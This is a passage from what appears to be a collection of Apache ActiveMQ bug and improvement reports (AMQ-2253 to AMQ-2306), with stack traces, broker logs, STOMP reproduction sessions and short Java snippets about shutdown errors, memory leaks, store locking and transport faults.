org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) - locked <0x8294ded0> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.nio.NIOTransport.serviceRead(NIOTransport.java:128) at org.apache.activemq.transport.nio.NIOTransport.access$000(NIOTransport.java:44) at org.apache.activemq.transport.nio.NIOTransport$1.onSelect(NIOTransport.java:68) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:62) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:98) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675) at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-2253
type:Bug
changed files:SelectorSelection.java
texts:exception on stop: NIOTransport - Could not stop service: ... Reason: java.nio.channels.CancelledKeyException
When using NIO the broker can emit the following on shutdown ERROR - NIOTransport                   - Could not stop service: tcp:///127.0.0.1:55470. Reason: java.nio.channels.CancelledKeyExceptionjava.nio.channels.CancelledKeyException at sun.nio.ch.SelectionKeyImpl.ensureValid(SelectionKeyImpl.java:55) at sun.nio.ch.SelectionKeyImpl.interestOps(SelectionKeyImpl.java:64) at org.apache.activemq.transport.nio.SelectorSelection.disable(SelectorSelection.java:52) at org.apache.activemq.transport.nio.NIOTransport.doStop(NIOTransport.java:152) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:69) at org.apache.activemq.transport.tcp.TcpTransport.stop(TcpTransport.java:499) at org.apache.activemq.transport.InactivityMonitor.stop(InactivityMonitor.java:117) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64) at org.apache.activemq.transport.WireFormatNegotiator.stop(WireFormatNegotiator.java:91) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64) at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:967) at org.apache.activemq.broker.jmx.ManagedTransportConnection.doStop(ManagedTransportConnection.java:74) at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:932)
issueID:AMQ-2254
type:Bug
changed files:ProtocolConverter.java
texts:NullPointerException on invalid STOMP message
I discovered accidentally that the following invalid STOMP conversation will reliably cause a NullPointerException in activemq:cli> CONNECTcli> &#91;&#39;username: &#39;, &#39;password: &#39;&#93;srv> CONNECTEDsrv> session:ID:slc1-40603-1242413649494-4:9cli> SUBSCRIBEcli> &#91;&#39;ack: client&#39;, &#39;destination: /queue/raw_input&#39;&#93;java.lang.NullPointerException        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:370)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:83)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:93)        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:541)        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:345)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:78)        at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:135)        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSubscribe(ProtocolConverter.java:399)        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommad(ProtocolConverter.java:183)        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:67)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)        at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-2256
type:Bug
changed files:TcpTransportFactory.java
texts:Unnecessary TcpTransportFactory NumberFormatException and warning
When executing TcpTransportFactory.createTransport(URI location, WireFormat wf) the following warning is incorrectly generated:WARNING: path isn"t a valid local location for TcpTransport to usejava.lang.NumberFormatException: For input string: "/exampleTopic" at java.lang.NumberFormatException.forInputString(NumberFormatException.java:48) at java.lang.Integer.parseInt(Integer.java:447) at java.lang.Integer.parseInt(Integer.java:497) at org.apache.activemq.transport.tcp.TcpTransportFactory.createTransport(TcpTransportFactory.java:125) at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:141) at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:51) at org.apache.activemq.transport.TransportFactory.connect(TransportFactory.java:80) at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:237) at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:252) at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:224) at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:172)...With the topic name set to "/exampleTopic"The code responsible for this looks like:        URI localLocation = null;        String path = location.getPath();        // see if the path is a local URI location        if (path != null && path.length() > 0) {            int localPortIndex = path.indexOf(":");            try {                Integer.parseInt(path.substring(localPortIndex + 1, path.length()));                String localString = location.getScheme() + ":/" + path;                localLocation = new URI(localString);            } catch (Exception e) {                LOG.warn("path isn"t a valid local location for TcpTransport to use", e);            }        }        SocketFactory socketFactory = createSocketFactory();        return createTcpTransport(wf, socketFactory, location, localLocation);    }The problem seems to be that for the path="/exampleTopic", the following line:           int localPortIndex = path.indexOf(":");returns -1 (no colon and no port specified in pathand the subsequent line:             Integer.parseInt(path.substring(localPortIndex + 1, path.length()));generates the NumberFormatException (because the path does not have any integer).It seems that perhaps there should be some test like:if (localPortIndex != -1) {...}I will create a patch if desired.  Just LMK.
issueID:AMQ-2257
type:Bug
changed files:
texts:ActiveMQ Build Fails on protobuf
When compiling ActiveMQ in a clean environment, the Maven script fails to download the protobuf jar files.  In order to reproduce this, your local Maven repository needs to be deleted and ActiveMQ built from scratch.  I use the following command-line when I build, but it is not necessary to reproduce the problem:mvn -Dtest=false clean installAttached is a patch to the pom.xml file that adds the required repository path to correctly download the protobuf jar file.
issueID:AMQ-2258
type:Improvement
changed files:PooledSession.java
texts:PooledSession doen&#39;t support blob message
org.apache.activemq.pool.PooledSession or  org.jencks.amqpool.PooledSession does not support Blob messages, as createBlobMessage method is missing from both the PooledSession.we are using spring JMS integration, where we get the activeMq PooledSession if we use ActiveMQ connection poolingBelow is the code we are trying to use.   this.jmsTemplate.send(this.destination, new MessageCreator() {      public Message createMessage(Session session) throws JMSException {       org.apache.activemq.pool.PooledSession pooledSession = (org.apache.activemq.pool.PooledSession)session     // We need support for below method   BlobMessage blobMessage  = session.createBlobMessage(response); // this method is missing        return blobMessage;      }    });we are using activeMQ 5.2forum ref :  http://www.nabble.com/PooledSession-doen%27t-support-blob-message-td23614284.html
issueID:AMQ-2262
type:Bug
changed files:
texts:Inflight message count becomes negative when messages expire
The inflight message counter is not correctly updated when messages expire. When a large volume of messages expire the count becomes negative.
issueID:AMQ-2265
type:Bug
changed files:
texts:potential OOM (OutOfMemory) on consumer when all prefetched messages expire
With a short time to live and a slow consumer, prefetched messages stored on the consumer expire. These get a delivery ack (so more mesages can be dispatched) but remain in the delivered list till a real ack is produced, on the consumption of an non expired message. With a large backlog and very slow consumer each prefetch set can be expired and the delivered list can grow to produce an ome.
issueID:AMQ-2274
type:Bug
changed files:
texts:Setting keepAlive through URL does nothing
I use ActiveMQ 5.2 and configure a client using jndi.properties with connection url:connection.TopicConnectionFactory.brokerURL=tcp://localhost:61616?soTimeout=30000&connectionTimeout=30000&keepAlive=true&minmumWireFormatVersion=3&jms.prefetchPolicy.all=5All boolean properties (keepAlive) are ignored
issueID:AMQ-2275
type:Improvement
changed files:
texts:Disable JMX authentication, SSL and specify a port number by default in the startup script
It"s very confusing for users to be required to edit the ActiveMQ startup script in order to utilize the activemq-admin script. Let"s change the default JMX configuration so that authentication is disabled, SSL is disabled and a port number is specified. This is really just swapping the lines that are currently there.
issueID:AMQ-2277
type:Bug
changed files:
texts:NIO SelectorWorker not protecting its Selector from mutable operations
When you hit the NIO transport with heavy concurrent connection load the brokers thread usage spikes with lots of threads in the state below.   "ActiveMQ Transport Initiator: /10.129.112.166:59560" daemon prio=10 tid=0x007a2fc0 nid=0x34b waiting for monitor entry &#91;0xc4381000..0xc4381888&#93;        at org.apache.activemq.transport.nio.SelectorManager.register(SelectorManager.java:65) waiting to lock <0xd8b1d920> (a org.apache.activemq.transport.nio.SelectorManager)        at org.apache.activemq.transport.nio.NIOTransport.initializeStreams(NIOTransport.java:66)        at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:453)        at org.apache.activemq.transport.nio.NIOTransport.doStart(NIOTransport.java:146)        at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:57)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:57)        at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)        at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:57)        at org.apache.activemq.broker.TransportConnection.start(TransportConnection.java:880) locked <0xdb727578> (a org.apache.activemq.broker.jmx.ManagedTransportConnection)        at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:213)Problem is easily reproducible when consumer/producer are on a different machine to the broker - when running everything locally .. not so much.It seems the SelectorWorker is not tolerant of lots of concurrent updates to the state of the Selector, and the selector gets into a bad state. Attached patch seems to resolve the issue. Patch adds some locking around when selectorKeys are registered and canceled.
issueID:AMQ-228
type:Bug
changed files:
texts:Eclipse project for Core not working
The .classpath file for the core module contains a classpath entry for <ACTIVEMQ_HOME>/src/class (absolute path), whereas the correct path would be <ACTIVEMQ_HOME>/modules/core/src/conf (absolute path) or just src/conf (rel. path).The fix is as easy as adding ${basedir} in /modules/core/project.properties line 10:maven.eclipse.classpath.include=${basedir}/src/conf
issueID:AMQ-2280
type:Bug
changed files:
texts:stomp: Transport failed: java.io.IOException: Unexpected error occured
This does not happen in 5.2.0, only in 5.3..SNAPSHOT I"m getting the above exception with the following STOMP session> telnet localhost 61613Trying 127.0.0.1...Connected to localhost.Escape character is "^]".CONNECTpasscode:passwordlogin:login^@CONNECTEDsession:ID:alex-60773-1244124360289-2:2SUBSCRIBEactivemq.prefetchSize:1ack:clientdestination:/queue/COMMAND.HOST.alexactivemq.exclusive:true^@BEGINdestination:/queue/COMMANDREPLY.HOST.alextransaction:ID:alex-58262-1244123488785-2:1-1persistent:true^@SENDdestination:/queue/COMMANDREPLY.HOST.alextransaction:ID:alex-58262-1244123488785-2:1-1receipt:ID:alex-58262-1244123488785-2:1-2persistent:truereplytext^@RECEIPTreceipt-id:ID:alex-58262-1244123488785-2:1-2COMMITdestination:/queue/COMMANDREPLY.HOST.alextransaction:ID:alex-58262-1244123488785-2:1-1^@Connection closed by foreign host.at this point AMQ closses the TCP connection and I see the following in the log (DEBUG root log level):DEBUG TransportConnection            - Setting up new connection: /127.0.0.1:44692DEBUG AMQPersistenceAdapter          - dataFilesInProgress.values: (0) []DEBUG AMQPersistenceAdapter          - lastDataFile: 1DEBUG AsyncDataManager               - lastFileId=0, purgeList: (0) []DEBUG AbstractRegion                 - localhost adding consumer: ID:alex-60773-1244124360289-2:2:-1:1 for destination: queue://COMMAND.HOST.alexDEBUG AMQPersistenceAdapter          - Checkpoint started.DEBUG AMQPersistenceAdapter          - Checkpoint done.DEBUG AMQPersistenceAdapter          - Checkpoint started.DEBUG AMQPersistenceAdapter          - Checkpoint done.DEBUG AMQPersistenceAdapter          - dataFilesInProgress.values: (0) []DEBUG AMQPersistenceAdapter          - lastDataFile: 1DEBUG AsyncDataManager               - lastFileId=0, purgeList: (0) []DEBUG AMQPersistenceAdapter          - Checkpoint started.DEBUG AMQPersistenceAdapter          - Checkpoint done.DEBUG AMQMessageStore                - Journalled transacted message add for: ID:alex-60773-1244124360289-2:2:-1:1:1, at: offset = 10973, file = 1, size = 375, type = 1DEBUG AMQPersistenceAdapter          - dataFilesInProgress.values: (0) []DEBUG AMQPersistenceAdapter          - lastDataFile: 1DEBUG AsyncDataManager               - lastFileId=0, purgeList: (0) []DEBUG AMQPersistenceAdapter          - Checkpoint started.DEBUG AMQPersistenceAdapter          - Checkpoint done.DEBUG Transport                      - Transport failed: java.io.IOException: Unexpected error occuredjava.io.IOException: Unexpected error occured at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:192) at java.lang.Thread.run(Thread.java:619)Caused by: java.util.NoSuchElementException at java.util.LinkedList.getFirst(LinkedList.java:109) at org.apache.activemq.transport.stomp.StompSubscription.onStompCommit(StompSubscription.java:130) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommit(ProtocolConverter.java:337) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:179) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:67) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) ... 1 moreDEBUG TransportConnection            - Stopping connection: /127.0.0.1:44692DEBUG TcpTransport                   - Stopping transport tcp:///127.0.0.1:44692DEBUG TransportConnection            - Stopped transport: /127.0.0.1:44692DEBUG TransportConnection            - Cleaning up connection resources: /127.0.0.1:44692DEBUG AbstractRegion                 - localhost removing consumer: ID:alex-60773-1244124360289-2:2:-1:1 for destination: queue://COMMAND.HOST.alexDEBUG LocalTransaction               - rollback: TX:ID:alex-60773-1244124360289-2:2:1 syncCount: 3DEBUG AMQMessageStore                - Transacted message add rollback for: ID:alex-60773-1244124360289-2:2:-1:1:1, at: offset = 10973, file = 1, size = 375, type = 1DEBUG TransportConnection            - Connection Stopped: /127.0.0.1:44692
issueID:AMQ-2282
type:Improvement
changed files:
texts:Test failures on IBM JDK
None
issueID:AMQ-2283
type:Bug
changed files:
texts:New Multicast discovery agent thread is created for each message
I found out that a new thread is started for each message I send, but that thread is staying alive for the whole program lifetime.The number of live "multicast discovery agent notifier" threads scales up linearly.Eventually I ended up with 10000 threads of the above type runningIt doesn"t seems to be a camel issue since when I try with tcp://localhost:61616 everything works fine.I"m suspecting a bug. and I wanted to share it with you before I open a ticket.Eric=============package com.mycompany.CamelExample;import javax.jms.ConnectionFactory;import org.apache.activemq.ActiveMQConnectionFactory;import org.apache.camel.CamelContext;import org.apache.camel.ProducerTemplate;import org.apache.camel.builder.RouteBuilder;import org.apache.camel.component.jms.JmsComponent;import org.apache.camel.impl.DefaultCamelContext;import org.apache.log4j.Logger;public final class App {   private static Logger log = Logger.getLogger("CamelTestApp");   public static void main(String args[]) throws Exception {        CamelContext context = new DefaultCamelContext();        ConnectionFactory connectionFactory =                    new ActiveMQConnectionFactory("failover:(discovery:(multicast://224.1.2.3:6255?group=default),tcp://localhost:61616)");        final String JMSTOPID = "test-jms";        final String DEST_TOPIC = "test-jms:topic:TCommandRequest";        final String SRC_TOPIC = "test-jms:topic:TCommandRequest";        context.addComponent("test-jms", JmsComponent.jmsComponentAutoAcknowledge(connectionFactory));        context.addRoutes(new RouteBuilder() {            public void configure() {from(SRC_TOPIC).to("mock:test");}});        ProducerTemplate template = context.createProducerTemplate();        context.start();           while (true) {                template.sendBody(DEST_TOPIC, "TEST_TEXT");               Thread.sleep(5000);            }    }}======================My log shows:12:02:06,212  INFO DefaultCamelContext:729 - Apache Camel 2.0-M1 (CamelContext:camel-1) is starting12:02:06,582  WARN ObjectHelper:523 - Cannot find class: org.apache.xalan.xsltc.trax.DOM2SAX12:02:07,137  INFO DiscoveryTransport:73 - Adding new broker connection URL: tcp://192.168.0.1:6161612:02:07,220  INFO FailoverTransport:714 - Successfully connected to tcp://192.168.0.1:6161612:02:07,222  INFO FailoverTransport:714 - Successfully connected to discovery:(multicast://224.1.2.3:6255?group=default)12:02:07,247  INFO DefaultCamelContext:771 - Apache Camel 2.0-M1 (CamelContext:camel-1) started12:02:07,640  INFO DiscoveryTransport:73 - Adding new broker connection URL: tcp://192.168.0.1:6161612:02:07,715  INFO FailoverTransport:714 - Successfully connected to tcp://192.168.0.1:6161612:02:07,716  INFO FailoverTransport:714 - Successfully connected to discovery:(multicast://224.1.2.3:6255?group=default)12:02:13,181  INFO DiscoveryTransport:73 - Adding new broker connection URL: tcp://192.168.64.1:6161612:02:13,220  INFO FailoverTransport:714 - Successfully connected to tcp://192.168.0.1:6161612:02:13,222  INFO FailoverTransport:714 - Successfully connected to discovery:(multicast://224.1.2.3:6255?group=default)12:02:18,731  INFO DiscoveryTransport:73 - Adding new broker connection URL: tcp://192.168.0.1:6161612:02:18,961  INFO FailoverTransport:714 - Successfully connected to tcp://192.168.0.1:6161612:02:18,963  INFO FailoverTransport:714 - Successfully connected to discovery:(multicast://224.1.2.3:6255?group=default)...
issueID:AMQ-2285
type:Bug
changed files:
texts:KahaDB store file lock issue - NPE if store is locked and failIfDatabaseIsLocked is set. Only one try otherwise
2009-06-10 09:37:12,462 [com.fusesource.support.StoreBrokerRunner.main()] INFO  BrokerService - Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBStore@bb65982009-06-10 09:37:12,470 [com.fusesource.support.StoreBrokerRunner.main()] ERROR BrokerService - Failed to start ActiveMQ JMS Message Broker. Reason: java.io.IOException: File "storeBroker1/kahadbstore/lock" could not be locked.java.io.IOException: File "storeBroker1/kahadbstore/lock" could not be locked. at org.apache.kahadb.util.LockFile.lock(LockFile.java:67) at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:225) at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:279) at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:164) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:463) at com.fusesource.support.StoreBrokerRunner.main(StoreBrokerRunner.java:56) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:283) at java.lang.Thread.run(Thread.java:613)2009-06-10 09:37:12,474 [com.fusesource.support.StoreBrokerRunner.main()] INFO  BrokerService - ActiveMQ Message Broker (slaveBroker1, null) is shutting down2009-06-10 09:37:12,474 [com.fusesource.support.StoreBrokerRunner.main()] INFO  TransportConnector - Connector nio://127.0.0.1:61627?useQueueForAccept=false Stopped2009-06-10 09:37:12,484 [com.fusesource.support.StoreBrokerRunner.main()] ERROR KahaDBStore - Could not stop service: org.apache.activemq.store.kahadb.KahaDBStore@bb6598. Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:315) at org.apache.activemq.store.kahadb.MessageDatabase.stop(MessageDatabase.java:170) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:541) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:509) at com.fusesource.support.StoreBrokerRunner.main(StoreBrokerRunner.java:56) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:283) at java.lang.Thread.run(Thread.java:613)2009-06-10 09:37:12,486 [com.fusesource.support.StoreBrokerRunner.main()] DEBUG ManagementContext - Probably not using JRE 1.4: mx4j.tools.naming.NamingService2009-06-10 09:37:12,492 [com.fusesource.support.StoreBrokerRunner.main()] INFO  BrokerService - ActiveMQ JMS Message Broker (slaveBroker1, null) stopped2009-06-10 09:37:12,492 [com.fusesource.support.StoreBrokerRunner.main()] WARN  BrokerService - Failed to stop broker after failure in start java.lang.NullPointerException at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:315) at org.apache.activemq.store.kahadb.MessageDatabase.stop(MessageDatabase.java:170) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:541) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:509) at com.fusesource.support.StoreBrokerRunner.main(StoreBrokerRunner.java:56) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:283) at java.lang.Thread.run(Thread.java:613)2009-06-10 09:37:12,493 [com.fusesource.support.StoreBrokerRunner.main()] ERROR StoreBrokerRunner - java.io.IOException: File "storeBroker1/kahadbstore/lock" could not be locked.
issueID:AMQ-2290
type:Bug
changed files:
texts:Memory leak in SelectorParser LRUCache
There appears to be a memory leak in the LRUCache used by the SelectorParser. We have a simple selector-based request/response implementation which means we create a new selector on every request and these appear to be sticking around despite the use of an LRUCache with a 10,000 entry limit. A quick look at the LRUCache code didn"t reveal any obvious problems, so I"m not sure what"s going on here. For the time being we are rolling back to 5.2.
issueID:AMQ-2291
type:Bug
changed files:OracleJDBCAdapter.java
InformixJDBCAdapter.java
AxionJDBCAdapter.java
Statements.java
MaxDBJDBCAdapter.java
SybaseJDBCAdapter.java
texts:Messages with an ID > (2^31 - 1) are not persisted to long term storage
2009/05/12 10:39:23.551 WARN &#91;org.apache.activemq.store.journal.JournalMessageStore&#93; Could not replay add for message "ID:xxx-xxx-39616-1241827394543-0:159880:1:1:1". Message may have already been added. reason: java.io.IOException: Duplicate entry "2147483647" for key 1The variable sequenceDataType in class org.apache.activemq.store.jdbc.Statments needs to be changed from an INTEGER to a LONG.
issueID:AMQ-2292
type:Bug
changed files:
texts:NullPointerException in ReadOnlyAsyncDataManager as accessorPool is not initialized
When you try and use the ReadOnlyAsyncDataManager it throws a NullPointerException like the following:java.lang.NullPointerException at org.apache.activemq.kaha.impl.async.AsyncDataManager.getNextLocation(AsyncDataManager.java:547) at org.apache.activemq.kaha.impl.async.ReadOnlyAsyncDataManager.getFirstLocation(ReadOnlyAsyncDataManager.java:128) at org.apache.activemq.kaha.impl.async.JournalImplTest.testReadOnlyRead(JournalImplTest.java:161) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at junit.framework.TestCase.runTest(TestCase.java:168) at junit.framework.TestCase.runBare(TestCase.java:134) at junit.framework.TestResult$1.protect(TestResult.java:110) at junit.framework.TestResult.runProtected(TestResult.java:128) at junit.framework.TestResult.run(TestResult.java:113) at junit.framework.TestCase.run(TestCase.java:124) at junit.framework.TestSuite.runTest(TestSuite.java:232) at junit.framework.TestSuite.run(TestSuite.java:227) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:81)The ReadOnlyDataManager needs to init an accessorPool. Testcase and patch attached.
issueID:AMQ-2298
type:Improvement
changed files:
texts:Make network duplicate subscription suppression feature priority based when networkConsumerPrioritys are in play.
Improvement to duplicate subscription suppression feature for queues http://issues.apache.org/activemq/browse/AMQ-2198Rather than first subscription wins, allow a higher priority subscription to replace an existing duplicate subscription.Given brokers A,B,C, a consumer on A can be visible on C as A-C or A-B-C. With suppression, only one would be allowed but it was non deterministic. With this improvement, when decreaseNetworkConsumerPriority is uses, A-C will replace A-B-C as it will have higher priority.
issueID:AMQ-2302
type:Bug
changed files:
texts:enqueue count, dequeue count and dispatch queue size always 0 for any connections shown in the ActiveMQ web console.
In the connection view of the ActiveMQ web console, all statistics such as enqueue count, dequeue count and dispatch queue size are always 0, although messages are pushed through on that connections. See the screenshot.
issueID:AMQ-2303
type:Bug
changed files:
texts:Durable consumers recovery
When a broker with a lots of durable consumers goes down and is restarted with forced store recovery, producer fails with the following exception afterwards2009-06-24 17:54:02,923 [127.0.0.1:55928] ERROR AbstractStoreCursor            - Failed to fill batchjava.lang.IllegalStateException: Message id ID:houdfrazierc.americas.progress.com-55015-1245858822880-1:45:1:1:1 could not be recovered from the data store for: topic://failoverTopic - already dispatched at org.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessageReference(RecoveryListenerAdapter.java:62) at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverReference(KahaReferenceStore.java:88) at org.apache.activemq.store.kahadaptor.KahaTopicReferenceStore.recoverNextMessages(KahaTopicReferenceStore.java:307) at org.apache.activemq.store.amq.AMQTopicMessageStore.recoverNextMessages(AMQTopicMessageStore.java:60) at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.doFillBatch(TopicStorePrefetch.java:91) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:227) at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:99) at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.reset(StoreDurableSubscriberCursor.java:224) at org.apache.activemq.broker.region.PrefetchSubscription.dispatchPending(PrefetchSubscription.java:574) at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:158) at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:197) at org.apache.activemq.broker.region.policy.SimpleDispatchPolicy.dispatch(SimpleDispatchPolicy.java:49) at org.apache.activemq.broker.region.Topic.dispatch(Topic.java:577) at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:430) at org.apache.activemq.broker.region.Topic.send(Topic.java:368) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:354) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:443) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:224) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:95) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:133) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:455) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:639) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) at java.lang.Thread.run(Thread.java:613)
issueID:AMQ-2304
type:Improvement
changed files:
texts:no XML topic list in web admin console
I was surprised to see that there is no topics list in XML in web admin application, so I quickly came up with oneattached is webapps/admin/xml/topics.jsp and a patch for frontpage decorator so that a link appears in the box
issueID:AMQ-2305
type:Bug
changed files:
texts:TransportConnection Ignores isShutdownOnSlaveFailure
In a pure Master/Slave configuration, when the slave fails the TransportConnection invokes the MasterBroker"s stop() method without taking into consideration the shutdownOnSlaveFailure boolean, which by default is set to false.  So even if shutdownOnSlaveFailure  is set to false, all my plugin brokers" stop methods get invoked when the slave fails.
issueID:AMQ-2306
type:Bug
changed files:ManagementContext.java
texts:Unable to monitor or manage slave brokers in shared filesystem master slave configuration
It appears that when running in shared master slave configuration one cant connect to the jmx console or use activemq-admin to stop the slave.Start a slave with a master runningACTIVEMQ_HOME: /itdept/apache-activemq-5.2.0ACTIVEMQ_BASE: /itdept/apache-activemq-5.2.0Loading message broker from: xbean://itdept//messagebroker/activemq-config/broker3.xmlINFO  BrokerService                  - Using Persistence Adapter: AMQPersistenceAdapter(/datafiles/itdept//activemq-journal)WARN  AMQPersistenceAdapter          - Waiting to Lock the Store /datafiles/itdept/activemq-journalNotice that no connections including jmx have been started...attempts to stop the broker with activemq-admin fail with..Caused by: java.net.ConnectException: Connection refusedKill the master and getINFO  AMQPersistenceAdapter          - Aquired lock for AMQ Store/datafiles/itdept/activemq-journalINFO  BrokerService                  - ActiveMQ 5.2.0 JMS Message Broker (messagebroker3) is startingINFO  BrokerService                  - For help or more information please see: http://activemq.apache.org/INFO  KahaStore                      - Kaha Store using data directory /datafiles/itdept/activemq-journal/kr-store/dataINFO  